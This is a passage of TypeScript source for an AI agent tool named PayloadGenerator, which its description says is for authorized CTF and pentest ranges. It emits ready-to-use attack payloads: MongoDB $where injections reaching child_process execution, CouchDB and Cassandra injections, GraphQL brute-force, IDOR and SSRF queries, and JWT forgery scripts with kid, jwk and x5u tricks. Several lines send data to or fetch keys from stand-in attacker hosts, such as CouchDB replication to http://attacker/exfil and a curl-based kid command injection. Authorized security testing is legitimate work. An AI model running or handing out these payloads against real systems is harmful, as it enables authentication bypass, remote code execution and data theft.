        '{"$where":"function(){var s=db.getCollectionNames();for(var i in s){print(s[i]);}return false;}"}')
      push('MongoDB — error-based via $toString on invalid type',
        '{"$expr":{"$toString":"$non_existent_field"}}')
    }
    if (ctx === 'js-injection' || ctx === 'all') {
      push('MongoDB — server-side JS via $where (RCE if mongo enabled eval)',
        '{"$where":"sleep(5000)"}')
      push('MongoDB — server-side JS execution via mapReduce',
        '{"$where":"this.x.constructor.constructor(\'return this\')().process.mainModule.require(\'child_process\').execSync(\'id\')"}')
      push('MongoDB — server-side JS via $accumulator (RCE)',
        '{"$accumulator":{"init":"function(){return 0}","accumulate":"function(state,value){return state+value}","accumulateArgs":["$$ROOT.x"],"merge":"function(a,b){return a+b}","lang":"js"}}')
    }
    if (ctx === 'blind' || ctx === 'all') {
      push('MongoDB — blind via $regex timing',
        '{"password":{"$regex":"^a.{1000}.*$"}}')
      push('MongoDB — blind via $where sleep',
        '{"$where":"sleep(5000)||true"}')
    }
  }

  // CouchDB
  if (db === 'couchdb' || db === 'all') {
    push('CouchDB — Mango query selector injection (auth bypass)',
      '{"selector":{"_id":"_design/admin","valid":{"$gt":null}}}')
    push('CouchDB — _all_docs key injection',
      '?startkey="_"&endkey="\\ufff0"&include_docs=true')
    push('CouchDB — replication trigger (POST /_replicate)',
      '{"source":"users","target":"http://attacker/exfil"}')
    push('CouchDB — config db read (admin only)',
      'GET /_config/')
  }

  // Cassandra CQL
  if (db === 'cassandra' || db === 'all') {
    push('Cassandra CQL — batch statement injection',
      "INSERT INTO users (id, password) VALUES (1, 'x'); UPDATE users SET role='admin' WHERE id=1;--")
    push('Cassandra — BATCH injection (no transaction rollback on error)',
      "BEGIN BATCH INSERT INTO users(id,password) VALUES(1,'x'); UPDATE users SET role='admin' WHERE id=1; APPLY BATCH")
    push('Cassandra — ALLOW FILTERING on missing index (info leak via timing)',
      "SELECT * FROM users WHERE password='x' ALLOW FILTERING")
  }

  out.push('## Generic JSON operator injection helper')
  out.push('```json')
  out.push('// Append operator keys to any user-controlled field name in a JSON body:')
  out.push('{"username":{"$ne":"x"},"password":{"$gt":""}}')
  out.push('// Test these keys in order (some apps only block $ne, allow $regex):')
  out.push('// $ne, $gt, $gte, $lt, $lte, $in, $nin, $exists, $regex, $where, $or, $and, $not, $nor')
  out.push('```')

  return out.join('\n')
}

// ── GraphQL Injection payloads ─────────────────────────────────────────────

function graphqlPayloads(op: GraphqlOp, endpoint: string): string {
  const out: string[] = ['[PayloadGenerator] GraphQL Injection Payloads', '═'.repeat(60), '']
  out.push(`Operation: ${op}  Endpoint: ${endpoint || '/graphql'}`)
  out.push('')
  const push = (label: string, payload: string) => {
    out.push(`## ${label}`)
    out.push('```graphql')
    out.push(payload)
    out.push('```')
    out.push('')
  }

  if (op === 'introspect' || op === 'all') {
    push('Full introspection (GET schema)',
      'query { __schema { types { name fields { name type { name kind ofType { name } } } } } }')
    push('Query introspection only (lighter)',
      '{ __schema { queryType { name fields { name args { name type { name } } type { name kind ofType { name } } } } } }')
    push('Mutation introspection',
      '{ __schema { mutationType { name fields { name args { name type { name } } } } } }')
    push('Subscription introspection',
      '{ __schema { subscriptionType { name fields { name } } } }')
  }

  if (op === 'batch' || op === 'all') {
    push('Batch query — brute force 2FA codes via aliases',
      'query { a:verify(code: "000000") b:verify(code: "000001") c:verify(code: "000002") /*...100 aliases...*/ }')
    push('Batch as array (legacy batch endpoint)',
      '[{"query":"{ user(id:1) { email } }"},{"query":"{ user(id:2) { email } }"}]')
    push('Batch — bypass rate limit by submitting many in one request',
      '[{"query":"mutation{login(user:\"a\",pass:\"b\"){token}}"}, /* x 50 */]')
  }

  if (op === 'aliases' || op === 'all') {
    push('Alias-based field enumeration (same field, different aliases = parallel queries)',
      '{ a:__type(name:"User"){name} b:__type(name:"Admin"){name} c:__type(name:"Secret"){name} }')
    push('Alias-based password brute force on single field',
      '{ a:login(user:"admin",pass:"a"){ok} b:login(user:"admin",pass:"b"){ok} c:login(user:"admin",pass:"c"){ok} }')
  }

  if (op === 'suggestions' || op === 'all') {
    push('Field suggestion leak (typo exposes field names)',
      '{ __schema { queryType { fields { name } } } }  // then GET with non-existent field')
    push('Field suggestions via /graphql?query= syntax',
      "GET /graphql?query={userz{id}}  // error: \"Did you mean user?\"")
  }

  if (op === 'idor' || op === 'all') {
    push('IDOR via direct object reference (objectId increment)',
      '{ user(id: 1) { email ssn passwordHash } }')
    push('IDOR via alias batch (dump all users in one request)',
      '{ a:user(id:1){email} b:user(id:2){email} c:user(id:3){email} d:user(id:4){email} }')
    push('IDOR via persisted query / cursor pagination bypass',
      '{ posts(after: null, first: 1000) { edges { node { author { privateEmail } } } } }')
    push('IDOR via fragment on hidden fields',
      'fragment FullUser on User { id email ssn passwordHash privateKey }  query { user(id: 1) { ...FullUser } }')
  }

  if (op === 'sqli-via-graphql' || op === 'all') {
    push('GraphQL → SQL via resolver (if backend uses string concat)',
      '{ user(name: "admin\' OR 1=1--") { id } }')
    push('GraphQL → NoSQL via resolver',
      '{ user(filter: "{\\"$ne\\":\\"x\\"}") { id } }')
    push('GraphQL → SSRF via URL field',
      '{ preview(url: "http://127.0.0.1:6379/") { html } }')
    push('GraphQL → OS command via resolver',
      '{ ping(host: "; id") { output } }')
  }

  out.push('## Postman-style raw query (POST application/json)')
  out.push('```json')
  out.push(JSON.stringify({
    query: 'query Introspection { __schema { types { name } } }',
    variables: {},
    operationName: 'Introspection',
  }, null, 2))
  out.push('```')

  return out.join('\n')
}

// ── JWT Attack payloads ────────────────────────────────────────────────────

function jwtPayloads(attack: JwtAttack, token: string): string {
  const out: string[] = ['[PayloadGenerator] JWT Attack Payloads', '═'.repeat(60), '']
  out.push(`Attack: ${attack}  Token: ${token || '<paste JWT here, format header.payload.signature>'}`)
  out.push('')
  const push = (label: string, payload: string) => {
    out.push(`## ${label}`)
    out.push('```')
    out.push(payload)
    out.push('```')
    out.push('')
  }
  const pushJson = (label: string, payload: string) => {
    out.push(`## ${label}`)
    out.push('```json')
    out.push(payload)
    out.push('```')
    out.push('')
  }

  const sampleDecodedHeader = '{"alg":"HS256","typ":"JWT"}'
  const sampleDecodedPayload = '{"sub":"1234567890","name":"John Doe","admin":false,"exp":9999999999}'

  // ── alg=none ──
  if (attack === 'none' || attack === 'all') {
    pushJson('alg=none (classic — most modern libs reject, still worth testing)',
      JSON.stringify({ header: { alg: 'none', typ: 'JWT' }, payload: sampleDecodedPayload, signature: '' }))
    pushJson('alg=None (case bypass)',
      JSON.stringify({ header: { alg: 'None', typ: 'JWT' }, payload: sampleDecodedPayload, signature: '' }))
    pushJson('alg=NONE',
      JSON.stringify({ header: { alg: 'NONE', typ: 'JWT' }, payload: sampleDecodedPayload, signature: '' }))
    pushJson('alg=nOnE (mixed)',
      JSON.stringify({ header: { alg: 'nOnE', typ: 'JWT' }, payload: sampleDecodedPayload, signature: '' }))
    pushJson('alg=HS256 with empty signature',
      JSON.stringify({ header: { alg: 'HS256', typ: 'JWT' }, payload: sampleDecodedPayload, signature: '' }))
    pushJson('alg=HS256 with signature stripped (just header.payload.)',
      JSON.stringify({ note: 'Keep the trailing dot — some libs treat missing sig as no-op' }))
  }

  // ── Algorithm confusion (HS256 ↔ RS256) ──
  if (attack === 'alg-confusion' || attack === 'all') {
    push('HS256 / RS256 confusion — re-sign token with HMAC using the public key as secret',
      '// Step 1: GET /.well-known/jwks.json or PEM public key from /api/auth/public-key')
    push('Step 2 — convert RSA public key PEM to raw bytes (one-liner)',
      `openssl rsa -pubin -in public.pem -modulus -noout | sed 's/Modulus=//' | xxd -r -p > pubkey.der`)
    push('Step 3 — forge token with HMAC(public_key, header.payload)',
      `// Header: {"alg":"HS256","typ":"JWT"}  // changed from RS256`)
    push('Python forgery script',
      `import jwt, base64\n` +
      `pub = open("public.pem","rb").read()\n` +
      `forged = jwt.encode({"sub":"admin","admin":True}, pub, algorithm="HS256")\n` +
      `print(forged)`)
    push('Node forgery script (jsonwebtoken)',
      `const jwt = require('jsonwebtoken');\n` +
      `const pub = require('fs').readFileSync('public.pem');\n` +
      `const forged = jwt.sign({sub:'admin',admin:true}, pub, {algorithm:'HS256'});`)
    push('Step 4 — sometimes also works with HS384/HS512 (just change header alg)',
      `// alg HS512, RS384 → HS384, RS512 → HS512`)
  }

  // ── Weak HMAC secret brute force ──
  if (attack === 'weak-secret' || attack === 'all') {
    push('Common weak secrets (top of wordlist for jwt-cracker / hashcat -m 16500)',
      'secret\nsecret123\nsecret1234\npassword\npassword123\n123456\n12345678\nqwerty\nadmin\nkey\njwt\njwt_secret\nchangeme\ndefault\ntest\nhmac\nhmac-secret\nsuper-secret\nmy-secret\nyour-256-bit-secret\nyour-secret-key\nkeyboard cat\nshhh')
    push('jwt-cracker (preferred — uses common JWT weak-secret wordlists)',
      'jwt-cracker <token> -w /usr/share/wordlists/jwt-secrets.txt')
    push('hashcat (when jwt-cracker not enough)',
      'hashcat -m 16500 token.txt jwt-secrets.txt')
    push('Python one-liner (single secret attempt)',
      `python -c "import jwt; print(jwt.decode('${token || '<TOKEN>'}', 'secret', algorithms=['HS256']))"`)
    push('CyberChef recipe (manual)',
      '// From header, get alg → use HMAC or RSA check on signature with candidate secret')
  }

  // ── kid injection ──
  if (attack === 'kid-injection' || attack === 'all') {
    pushJson('kid — path traversal to /dev/null (sig becomes empty hash, easy to forge)',
      JSON.stringify({ header: { alg: 'HS256', typ: 'JWT', kid: '/dev/null' }, payload: sampleDecodedPayload }))
    pushJson('kid — SQL injection (concat secret with attacker-controlled string)',
      JSON.stringify({ header: { alg: 'HS256', typ: 'JWT', kid: "1' UNION SELECT 'a'--" }, payload: sampleDecodedPayload }))
    pushJson('kid — command injection (exec → fetch via curl)',
      JSON.stringify({ header: { alg: 'HS256', typ: 'JWT', kid: '| curl http://attacker/`whoami`' }, payload: sampleDecodedPayload }))
    pushJson('kid — SSRF via file:// or http:// to attacker',
      JSON.stringify({ header: { alg: 'HS256', typ: 'JWT', kid: 'http://attacker/key.pem' }, payload: sampleDecodedPayload }))
    pushJson('kid — null byte / dot path traversal',
      JSON.stringify({ header: { alg: 'HS256', typ: 'JWT', kid: '../../../../dev/null' }, payload: sampleDecodedPayload }))
  }

  // ── jwk embed (self-signed, attacker controls the key) ──
  if (attack === 'jwk-embed' || attack === 'all') {
    pushJson('jwk header — embed your own RSA public key as the verification key',
      JSON.stringify({ header: { alg: 'RS256', typ: 'JWT', jwk: { kty: 'RSA', e: 'AQAB', n: '<attacker RSA modulus, base64url>', use: 'sig' } }, payload: sampleDecodedPayload }))
    push('Generate attacker key pair',
      'openssl genrsa -out attacker.pem 2048 && openssl rsa -in attacker.pem -pubout -out attacker.pub')
    push('Forge token with attacker private key (signed with attacker key, verifies with attacker public key from header)',
      `// Node: jwt.sign(payload, attackerPrivateKey, {algorithm:'RS256', header:{jwk:attackerPublicJwk}})`)
  }

  // ── x5u ──
  if (attack === 'x5u' || attack === 'all') {
    pushJson('x5u — point to attacker-hosted certificate chain',
      JSON.stringify({ header: { alg: 'RS256', typ: 'JWT', x5u: 'http://attacker.com/cert.pem' }, payload: sampleDecodedPayload }))
    push('Steps',
      '1) Generate self-signed cert: openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes\n' +
      '2) Host cert.pem on attacker.com\n' +
      '3) Sign token with key.pem\n' +
      '4) Some libraries blindly fetch x5u and verify with the cert')
  }

  out.push('## Universal verification helper (Node.js)')
  out.push('```javascript')
  out.push('function decodeJwt(t) {')
  out.push('  const [h,p] = t.split(".").map(s => JSON.parse(Buffer.from(s,"base64url").toString()));')
  out.push('  return { header: h, payload: p };')
  out.push('}')
  out.push('```')

  return out.join('\n')
}

// ── Tool definition ────────────────────────────────────────────────────────

export class PayloadGeneratorTool implements Tool {
  name = 'PayloadGenerator'

  definition: ToolDefinition = {
    type: 'function',
    function: {
      name: 'PayloadGenerator',
      description: `Generate ready-to-use attack payloads for authorized CTF/pentest ranges.

## Categories
- xss: XSS (per context: html / attr / js / script / event / url / all; + WAF bypass polyglots)
- sqli: SQL injection (per DB: mysql / mssql / postgres / oracle / sqlite; per context: union / boolean / time / error / stacked; per WAF bypass: cloudflare / modsecurity / f5 / akamai)
- lfi: Local File Inclusion (php-filter / data / expect / pearcmd / proc-self / log poisoning / Windows)
- rfi: Remote File Inclusion / RCE one-liners (linux / windows / php / python / java / node)
- deserialization: ysoserial-style gadget chains (Java: CommonsCollections*, Spring, Groovy, ROME; PHP: phpggc; Python: pickle/YAML; .NET: ysoserial.net)
- path_traversal: Encoded ..%2f / ..%5c / ..// / ....// + Tomcat ; variant
- xxe: Classic + OOB + JSON XXE
- ssrf: per protocol (gopher / file / dict / ldap / ftp) + IP blacklist bypass (decimal / hex / IPv6 / nip.io)
- cmdi: Command injection (Linux / Windows / PHP / Python / Java / Node)
- ssti: Server-side template injection (Jinja2 / Twig / FreeMarker / Velocity / Smarty)
- crlf: CRLF injection + HTTP Request Smuggling (CL.TE / TE.CL / H2 downgrade)
- smuggle: HTTP Request Smuggling variants
- nosqli: NoSQL injection (MongoDB $ne/$gt/$regex/$where/JS-injection / CouchDB Mango / Cassandra CQL batch)
- graphql: GraphQL (introspection / batch / aliases / suggestions / IDOR / sqli-via-graphql)
- jwt: JWT attacks (alg=none / HS256-RS256 confusion / weak-secret / kid SQLi/path-traversal / jwk embed / x5u)

## Usage
PayloadGenerator({ category: 'sqli', database: 'mysql', context: 'union', waf: 'cloudflare' })
PayloadGenerator({ category: 'xss', context: 'all' })
PayloadGenerator({ category: 'lfi', wrapper: 'pearcmd' })
PayloadGenerator({ category: 'deserialization', engine: 'java', gadget: 'CommonsCollections' })
PayloadGenerator({ category: 'ssrf', target_url: 'http://127.0.0.1:8080/admin' })
PayloadGenerator({ category: 'nosqli', nosql_db: 'mongodb', context: 'auth-bypass' })
PayloadGenerator({ category: 'graphql', attack: 'introspect', endpoint: '/graphql' })
PayloadGenerator({ category: 'jwt', attack: 'alg-confusion' })`,
      parameters: {
        type: 'object',
        properties: {
          category: {
            type: 'string',
            enum: ['xss', 'sqli', 'lfi', 'rfi', 'deserialization', 'path_traversal', 'xxe', 'ssrf', 'cmdi', 'ssti', 'crlf', 'smuggle', 'nosqli', 'graphql', 'jwt'],
            description: 'Payload category',
          },
          context: { type: 'string', description: 'XSS context (html/attr/js/script/event/url) or SQLi context (union/boolean/time/error/stacked) or NoSQLi context (auth-bypass/extract/js-injection/blind)' },
          database: { type: 'string', enum: ['mysql', 'mssql', 'postgres', 'oracle', 'sqlite', 'all'], description: 'Target SQL database (sqli category)' },
          nosql_db: { type: 'string', enum: ['mongodb', 'couchdb', 'cassandra', 'all'], description: 'Target NoSQL database (nosqli category)' },
          waf: { type: 'string', enum: ['cloudflare', 'modsecurity', 'f5', 'akamai', 'generic'], description: 'Target WAF for bypass variants' },
          wrapper: { type: 'string', enum: ['php-filter', 'data', 'expect', 'pearcmd', 'proc-self', 'log', 'win', 'all'], description: 'LFI wrapper' },
          platform: { type: 'string', enum: ['linux', 'windows', 'php', 'python', 'java', 'node', 'all'], description: 'RCE platform' },
          engine: { type: 'string', enum: ['java', 'php', 'python', 'dotnet', 'node'], description: 'Deserialization engine' },
          attack: { type: 'string', description: 'JWT attack type (none/alg-confusion/weak-secret/kid-injection/jwk-embed/x5u) or GraphQL operation (introspect/batch/aliases/suggestions/idor/sqli-via-graphql)' },
          gadget: { type: 'string', description: 'Gadget name (CommonsCollections5, Spring1, etc.) — auto = all' },
          file: { type: 'string', description: 'Target file for LFI / path-traversal / XXE' },
          command: { type: 'string', description: 'Command for RCE' },
          target_url: { type: 'string', description: 'Target URL for SSRF' },
          endpoint: { type: 'string', description: 'GraphQL endpoint URL/path' },
          token: { type: 'string', description: 'JWT token to analyze' },
        },
        required: ['category'],
      },
    },
  }

  async execute(input: Record<string, unknown>, _context: ToolContext): Promise<ToolResult> {
    const p = input as unknown as PayloadGeneratorInput
    const category = s(p.category)
    if (!category) return { content: 'Error: must provide `category`', isError: true }

    let output = ''
    try {
      switch (category) {
        case 'xss':
          output = xssPayloads((s(p.context) as XssContext) || 'all')
          break
        case 'sqli':
          output = sqliPayloads(
            (s(p.database) as SqliDb) || 'all',
            (s(p.context) as SqliContext) || 'all',
            (s(p.waf) as WafBypass) || 'generic',
          )
          break
        case 'lfi':
          output = lfiPayloads((s(p.wrapper) as LfiWrapper) || 'all', s(p.file))
          break
        case 'rfi':
          output = rfiPayloads((s(p.platform) as RcePlatform) || 'all', s(p.command))
          break
        case 'deserialization':
          output = deserializationPayloads((s(p.engine) as SerializationEngine) || 'java', s(p.gadget))
          break
        case 'path_traversal':
          output = pathTraversalPayloads(s(p.file))
          break
        case 'xxe':
          output = xxePayloads(s(p.file))
          break
        case 'ssrf':
          output = ssrfPayloads(s(p.target_url))
          break
        case 'cmdi':
          output = rfiPayloads((s(p.platform) as RcePlatform) || 'all', s(p.command))
          break
        case 'ssti':
          output = sstiPayloads(s(p.engine) || 'all')
          break
        case 'crlf':
        case 'smuggle':
          output = crlfPayloads()
          break
        case 'nosqli':
          output = nosqliPayloads(
            (s(p.nosql_db) as NosqlDb) || (s(p.database) as NosqlDb) || 'all',
            (s(p.context) as NosqlContext) || 'all',
          )
          break
        case 'graphql':
          output = graphqlPayloads(
            (s(p.attack) as GraphqlOp) || 'all',
            s(p.endpoint || p.target_url),
          )
          break
        case 'jwt':
          output = jwtPayloads(
            (s(p.attack) as JwtAttack) || 'all',
            s(p.token),
          )
          break
        default:
          return { content: `Unknown category: ${category}`, isError: true }
      }
      return { content: output, isError: false }
    } catch (err) {
      return { content: `PayloadGenerator error: ${(err as Error).message}`, isError: true }
    }
  }
}
